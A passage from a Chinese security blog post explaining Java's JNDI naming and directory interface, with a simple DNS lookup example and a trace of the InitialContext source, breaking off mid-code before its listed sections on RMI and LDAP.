<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>JAVA 协议安全笔记-JNDI篇 | Eki&#39;s blog</title>
    <meta name="generator" content="VuePress 1.9.5">
    <link rel="icon" href="/img/favicon.ico">
    <undefined></undefined>
    <link rel="alternate" type="application/rss+xml" href="https://blog.ieki.xyz/rss.xml" title="Eki&#39;s blog RSS Feed">
    <link rel="alternate" type="application/atom+xml" href="https://blog.ieki.xyz/feed.atom" title="Eki&#39;s blog Atom Feed">
    <link rel="alternate" type="application/json" href="https://blog.ieki.xyz/feed.json" title="Eki&#39;s blog JSON Feed">
    <meta name="description" content="网络空间安全技术博客">
    <meta name="keywords" content="CTF,Pentest,网络空间安全">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.05e4719f.css" as="style"><link rel="preload" href="/assets/js/app.8153bfb8.js" as="script"><link rel="preload" href="/assets/js/2.236d623d.js" as="script"><link rel="preload" href="/assets/js/67.3e60853d.js" as="script"><link rel="prefetch" href="/assets/js/10.46edbeee.js"><link rel="prefetch" href="/assets/js/100.6c7b5950.js"><link rel="prefetch" href="/assets/js/11.767adcb8.js"><link rel="prefetch" href="/assets/js/12.512cfd28.js"><link rel="prefetch" href="/assets/js/13.3a1a8df2.js"><link rel="prefetch" href="/assets/js/14.9af53798.js"><link rel="prefetch" href="/assets/js/15.ec2fb3eb.js"><link rel="prefetch" href="/assets/js/16.2a2ab730.js"><link rel="prefetch" href="/assets/js/17.f68cb202.js"><link rel="prefetch" href="/assets/js/18.63691748.js"><link rel="prefetch" href="/assets/js/19.c42e067a.js"><link rel="prefetch" href="/assets/js/20.d572d5a9.js"><link rel="prefetch" href="/assets/js/21.2adaf23d.js"><link rel="prefetch" href="/assets/js/22.ec130e8f.js"><link rel="prefetch" href="/assets/js/23.91dff6b1.js"><link rel="prefetch" href="/assets/js/24.e99440a5.js"><link rel="prefetch" href="/assets/js/25.c058aace.js"><link rel="prefetch" href="/assets/js/26.64c96eb1.js"><link rel="prefetch" href="/assets/js/27.dc5608c6.js"><link rel="prefetch" href="/assets/js/28.6485ffc0.js"><link rel="prefetch" href="/assets/js/29.853384e7.js"><link rel="prefetch" href="/assets/js/3.18b28bc3.js"><link rel="prefetch" href="/assets/js/30.5e8757c8.js"><link rel="prefetch" href="/assets/js/31.f620c04c.js"><link rel="prefetch" href="/assets/js/32.0b35c345.js"><link rel="prefetch" href="/assets/js/33.643f4002.js"><link rel="prefetch" href="/assets/js/34.17bda2ac.js"><link rel="prefetch" href="/assets/js/35.3194ffeb.js"><link rel="prefetch" href="/assets/js/36.7a864c05.js"><link rel="prefetch" href="/assets/js/37.ded9d5a1.js"><link rel="prefetch" href="/assets/js/38.e886837c.js"><link rel="prefetch" href="/assets/js/39.6fbcf82c.js"><link rel="prefetch" href="/assets/js/4.aa35785a.js"><link rel="prefetch" href="/assets/js/40.042825c7.js"><link rel="prefetch" href="/assets/js/41.be0e220a.js"><link rel="prefetch" href="/assets/js/42.16c54959.js"><link rel="prefetch" href="/assets/js/43.15487375.js"><link rel="prefetch" href="/assets/js/44.1bc3c0c9.js"><link rel="prefetch" href="/assets/js/45.4f713272.js"><link rel="prefetch" href="/assets/js/46.e09111f6.js"><link rel="prefetch" href="/assets/js/47.36f7aeac.js"><link rel="prefetch" href="/assets/js/48.f34dbf5d.js"><link rel="prefetch" href="/assets/js/49.736656d6.js"><link rel="prefetch" href="/assets/js/5.bf7c6b0f.js"><link rel="prefetch" href="/assets/js/50.198eeffb.js"><link rel="prefetch" href="/assets/js/51.97647028.js"><link rel="prefetch" href="/assets/js/52.c52a4607.js"><link rel="prefetch" href="/assets/js/53.7c2edc1a.js"><link rel="prefetch" href="/assets/js/54.fffca202.js"><link rel="prefetch" href="/assets/js/55.5ae50670.js"><link rel="prefetch" href="/assets/js/56.495068e5.js"><link rel="prefetch" href="/assets/js/57.a87d7435.js"><link rel="prefetch" href="/assets/js/58.67aa347c.js"><link rel="prefetch" href="/assets/js/59.df8d3736.js"><link rel="prefetch" href="/assets/js/6.3a52ecd1.js"><link rel="prefetch" href="/assets/js/60.dfcbd8de.js"><link rel="prefetch" href="/assets/js/61.c190617e.js"><link rel="prefetch" href="/assets/js/62.4cebd179.js"><link rel="prefetch" href="/assets/js/63.27f549f4.js"><link rel="prefetch" href="/assets/js/64.aa783284.js"><link rel="prefetch" href="/assets/js/65.5c153c60.js"><link rel="prefetch" href="/assets/js/66.57abb67a.js"><link rel="prefetch" href="/assets/js/68.fafb9569.js"><link rel="prefetch" href="/assets/js/69.bb71fbbe.js"><link rel="prefetch" href="/assets/js/7.ec46daa9.js"><link rel="prefetch" href="/assets/js/70.55a74c83.js"><link rel="prefetch" href="/assets/js/71.6edff065.js"><link rel="prefetch" href="/assets/js/72.2272d6b4.js"><link rel="prefetch" href="/assets/js/73.84a336f4.js"><link rel="prefetch" href="/assets/js/74.743857b6.js"><link rel="prefetch" href="/assets/js/75.7afd7794.js"><link rel="prefetch" href="/assets/js/76.c69ff262.js"><link rel="prefetch" href="/assets/js/77.a3789c9d.js"><link rel="prefetch" href="/assets/js/78.0a082dca.js"><link rel="prefetch" href="/assets/js/79.ac794bd1.js"><link rel="prefetch" href="/assets/js/8.20733eb2.js"><link rel="prefetch" href="/assets/js/80.f346fded.js"><link rel="prefetch" href="/assets/js/81.1148a126.js"><link rel="prefetch" href="/assets/js/82.a0646f03.js"><link rel="prefetch" href="/assets/js/83.3f5285e3.js"><link rel="prefetch" href="/assets/js/84.0b41ad40.js"><link rel="prefetch" href="/assets/js/85.05acaff5.js"><link rel="prefetch" href="/assets/js/86.6332ed81.js"><link rel="prefetch" href="/assets/js/87.1e154849.js"><link rel="prefetch" href="/assets/js/88.ef9fe71b.js"><link rel="prefetch" href="/assets/js/89.644c6266.js"><link rel="prefetch" href="/assets/js/9.34ad444d.js"><link rel="prefetch" href="/assets/js/90.7a517ed7.js"><link rel="prefetch" href="/assets/js/91.724c1d33.js"><link rel="prefetch" href="/assets/js/92.c37e9d81.js"><link rel="prefetch" href="/assets/js/93.e6e1d6ba.js"><link rel="prefetch" href="/assets/js/94.bd88bff3.js"><link rel="prefetch" href="/assets/js/95.a64b5926.js"><link rel="prefetch" href="/assets/js/96.11700cb6.js"><link rel="prefetch" href="/assets/js/97.61fe23a4.js"><link rel="prefetch" href="/assets/js/98.0ae964e9.js"><link rel="prefetch" href="/assets/js/99.44a05c74.js">
    <link rel="stylesheet" href="/assets/css/0.styles.05e4719f.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu have-body-img"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="Eki's blog" class="logo"> <span class="site-name can-hide">Eki's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><a href="/ctf/" class="link-title">CTF</a> <span class="title" style="display:none;">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>Library</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/php/" class="nav-link">PHP</a></li><li class="dropdown-subitem"><a href="/ctf/java/" class="nav-link">JAVA</a></li><li class="dropdown-subitem"><a href="/pages/f33ffd/" class="nav-link">Node</a></li><li class="dropdown-subitem"><a href="/pages/5939d7/" class="nav-link">Python</a></li></ul></li><li class="dropdown-item"><h4>Contest</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/pages/f3f203/" class="nav-link">D3CTF 2021 Write Up</a></li><li class="dropdown-subitem"><a href="/pages/8c33ec/" class="nav-link">虎符CTF2021</a></li><li class="dropdown-subitem"><a href="/pages/06932d/" class="nav-link">2021 红帽 Web Write Up</a></li></ul></li><li class="dropdown-item"><h4>Problem Set</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/ethernaut/" class="nav-link">Ethernaut Write Up</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/pentest/" class="nav-link">Pentest</a></div><div class="nav-item"><a href="/develop/" class="nav-link">Develop</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="More" class="dropdown-title"><a href="/more/" class="link-title">More</a> <span class="title" style="display:none;">More</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">Friends</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Favorites" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">Favorites</a> <span class="title" style="display:none;">Favorites</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">Website</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">Tools</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Archives" class="dropdown-title"><a href="/archives/" class="link-title">Archives</a> <span class="title" style="display:none;">Archives</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">Categories</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">Tags</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">Archives</a></li></ul></div></div> <a href="https://github.com/EkiXu/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/imgme.png"> <div class="blogger-info"><h3>Eki</h3> <span>Dreamer of Dreams</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><a href="/ctf/" class="link-title">CTF</a> <span class="title" style="display:none;">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>Library</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/php/" class="nav-link">PHP</a></li><li class="dropdown-subitem"><a href="/ctf/java/" class="nav-link">JAVA</a></li><li class="dropdown-subitem"><a href="/pages/f33ffd/" class="nav-link">Node</a></li><li class="dropdown-subitem"><a href="/pages/5939d7/" class="nav-link">Python</a></li></ul></li><li class="dropdown-item"><h4>Contest</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/pages/f3f203/" class="nav-link">D3CTF 2021 Write Up</a></li><li class="dropdown-subitem"><a href="/pages/8c33ec/" class="nav-link">虎符CTF2021</a></li><li class="dropdown-subitem"><a href="/pages/06932d/" class="nav-link">2021 红帽 Web Write Up</a></li></ul></li><li class="dropdown-item"><h4>Problem Set</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/ethernaut/" class="nav-link">Ethernaut Write Up</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/pentest/" class="nav-link">Pentest</a></div><div class="nav-item"><a href="/develop/" class="nav-link">Develop</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="More" class="dropdown-title"><a href="/more/" class="link-title">More</a> <span class="title" style="display:none;">More</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">Friends</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Favorites" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">Favorites</a> <span class="title" style="display:none;">Favorites</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">Website</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">Tools</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Archives" class="dropdown-title"><a href="/archives/" class="link-title">Archives</a> <span class="title" style="display:none;">Archives</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">Categories</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">Tags</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">Archives</a></li></ul></div></div> <a href="https://github.com/EkiXu/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>JAVA 协议安全笔记-JNDI篇</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/7a72b7/#_0x01-jndi介绍" class="sidebar-link">0x01 JNDI介绍</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/7a72b7/#naming" class="sidebar-link">Naming</a></li><li class="sidebar-sub-header level3"><a href="/pages/7a72b7/#directory" class="sidebar-link">Directory</a></li><li class="sidebar-sub-header level3"><a href="/pages/7a72b7/#interface" class="sidebar-link">Interface</a></li></ul></li><li><a href="/pages/7a72b7/#_0x02-quickstart" class="sidebar-link">0x02 QuickStart</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/7a72b7/#_0x03-jndi-的动态协议加载" class="sidebar-link">0x03 JNDI 的动态协议加载</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/7a72b7/#_0x04-jndi-的-reference" class="sidebar-link">0x04 JNDI 的 Reference</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/7a72b7/#_0x05-jndi-rmi" class="sidebar-link">0x05 JNDI + RMI</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/7a72b7/#_0x06-jndi-ldap" class="sidebar-link">0x06 JNDI + LDAP</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level3"><a href="/pages/7a72b7/#几个概念" class="sidebar-link">几个概念</a></li><li class="sidebar-sub-header level3"><a href="/pages/7a72b7/#quickstart" class="sidebar-link">QuickStart</a></li><li class="sidebar-sub-header level3"><a href="/pages/7a72b7/#reference" class="sidebar-link">Reference</a></li><li class="sidebar-sub-header level3"><a href="/pages/7a72b7/#serialize" class="sidebar-link">Serialize</a></li></ul></li><li><a href="/pages/7a72b7/#_0x07-总结" class="sidebar-link">0x07 总结</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/7a72b7/#_0x08-花絮" class="sidebar-link">0x08 花絮</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/pages/7a72b7/#_0x09-参考资料" class="sidebar-link">0x09 参考资料</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><!----> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://ieki.xyz" target="_blank" title="作者" class="beLink" data-v-06225672>Eki</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2022-02-17</a></div> <div title="分类" class="date iconfont icon-wenjian" data-v-06225672><a href="/categories/?category=%E9%9A%8F%E7%AC%94" data-v-06225672>随笔 </a></div></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">JAVA 协议安全笔记-JNDI篇<!----></h1>  <div class="theme-vdoing-content content__default"><h1 id="java-协议安全笔记-jndi篇"><a href="#java-协议安全笔记-jndi篇" class="header-anchor">#</a> JAVA 协议安全笔记-JNDI篇</h1> <blockquote><p>本文首发于跳跳糖社区 https://tttang.com/archive/1441/</p></blockquote> <h2 id="_0x01-jndi介绍"><a href="#_0x01-jndi介绍" class="header-anchor">#</a> 0x01 JNDI介绍</h2> <p>JNDI 全称为 <code>Java Naming and Directory Interface</code> 也即JAVA 名称和目录接口</p> <h3 id="naming"><a href="#naming" class="header-anchor">#</a> Naming</h3> <p>名称服务，简单来说就是通过名称查找实际对象的服务。事实上我们的DNS（通过域名查找实际的 IP 地址）和文件系统（通过文件名定位到具体的文件）就是一类名称服务</p> <p>在名称系统中，有几个重要的概念。</p> <ul><li><p><strong>Bindings</strong>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name</p></li> <li><p><strong>Context</strong>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (subcontext)。</p></li> <li><p><strong>References</strong>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</p></li></ul> <h3 id="directory"><a href="#directory" class="header-anchor">#</a> Directory</h3> <p>目录服务可以被认为是名称服务的一种拓展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性(attributes)信息。由此，我们不仅可以根据名称去查找(lookup)对象(并获取其对应属性)，还可以根据属性值去搜索(search)对象。</p> <p>以打印机服务为例，我们可以在命名服务中根据打印机名称去获取打印机对象(引用)，然后进行打印操作；同时打印机拥有速率、分辨率、颜色等属性，作为目录服务，用户可以根据打印机的分辨率去搜索对应的打印机对象。</p> <p>一些常见的目录服务有:</p> <ul><li>LDAP： 轻型目录访问协议</li> <li>Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</li> <li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li></ul> <h3 id="interface"><a href="#interface" class="header-anchor">#</a> Interface</h3> <p>为了方便在JAVA中使用目录协议，JAVA实现了一套目录服务的接口——JDNI,即<code>Java 的名称与目录服务接口</code>，应用通过该接口与具体的目录服务进行交互。从设计上，<code>JNDI</code>独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。</p> <p><code>JNDI</code>架构上主要包含两个部分，即 Java 的应用层接口和服务供应接口（SPI），如下图所示:</p> <p><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/img/202201181230227.png" alt=""></p> <p>java实现JNDI服务主要在下面5个包中:</p> <ul><li><p><code>javax.naming</code>：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</p></li> <li><p><code>javax.naming.directory</code>：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</p></li> <li><p><code>javax.naming.event</code>：在命名目录服务器中请求事件通知；</p></li> <li><p><code>javax.naming.ldap</code>：提供LDAP支持；</p></li> <li><p><code>javax.naming.spi</code>：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</p></li></ul> <h2 id="_0x02-quickstart"><a href="#_0x02-quickstart" class="header-anchor">#</a> 0x02 QuickStart</h2> <p>以JNDI支持的DNS查询为例</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">INITIAL_CONTEXT_FACTORY</span><span class="token punctuation">,</span> <span class="token string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token constant">PROVIDER_URL</span><span class="token punctuation">,</span> <span class="token string">&quot;dns://114.114.114.114&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">try</span> <span class="token punctuation">{</span>
	<span class="token class-name">DirContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialDirContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">Attributes</span> res <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">getAttributes</span><span class="token punctuation">(</span><span class="token string">&quot;example.com&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">&quot;A&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>可以看到首先是通过env初始化了一个上下文，这里定义了两个环境值一个是<code>INITIAL_CONTEXT_FACTORY</code>为<code>com.sun.jndi.dns.DnsContextFactory</code>DnsContext的工厂类，<code>PROVIDER_URL</code>为所提供的URL，在这里也就是dns服务器的地址。不难想到，决定JNDI上下文实际协议的的是<code>INITIAL_CONTEXT_FACTORY</code>。</p> <p>跟进</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token comment">//javax.naming.InitialContext</span>
    <span class="token keyword">public</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> environment<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> <span class="token class-name">NamingException</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>environment <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            environment <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Hashtable</span><span class="token punctuation">)</span>environment<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">init</span><span class="token punctuation">(</span>environment<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>最终</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token comment">//javax.naming.spi.NamingManager</span>
	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Context</span> <span class="token function">getInitialContext</span><span class="token punctuation">(</span><span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> env<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">{</span>
